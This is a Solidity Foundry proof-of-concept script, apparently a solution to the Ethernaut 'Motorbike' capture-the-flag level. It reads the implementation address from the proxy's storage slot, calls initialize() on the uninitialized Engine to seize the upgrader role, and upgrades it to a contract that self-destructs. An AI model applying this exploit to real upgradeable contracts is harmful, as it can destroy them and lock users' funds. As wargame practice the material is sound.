// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "../lib/forge-std/src/Script.sol";
import "forge-std/Script.sol";
import "../instances/Ilevel25.sol";

contract POC is Script {
    //get motorbike instance
    Motorbike level25 =
        Motorbike(payable(0xaEB5259933Fd15E2FFb849fBa666fA0A28A7EFdB));

    //Get instance of Engine.sol
    //vm.load(contract_address, slot_no) will produce a bytes32 value, and address is 20 bytes, so we need to convert it and store in an addrress type variable
    //address(uint160(uint256()))
    Engine engineAdr =
        Engine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(level25),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );

    function run() external {
        vm.startBroadcast();

        //take control of the Engine.sol contract to become the upgrader
        console.log("Initial Engine upgrader is: ", engineAdr.upgrader());
        engineAdr.initialize();

        //check that we are the upgrader
        console.log("Engine upgrader is: ", engineAdr.upgrader());

        //encode data to be passed to upgradeToAndCall()
        bytes memory encodedData = abi.encodeWithSignature("explode()");

        //call upgradeToAndCall() with address of bad contract and encodedData
        //deploy BadEngine.sol first
        engineAdr.upgradeToAndCall(
            0x1b48d249B261a0970460EF9bE4Ac73B181D44338,
            encodedData
        );

        vm.stopBroadcast();
    }
}
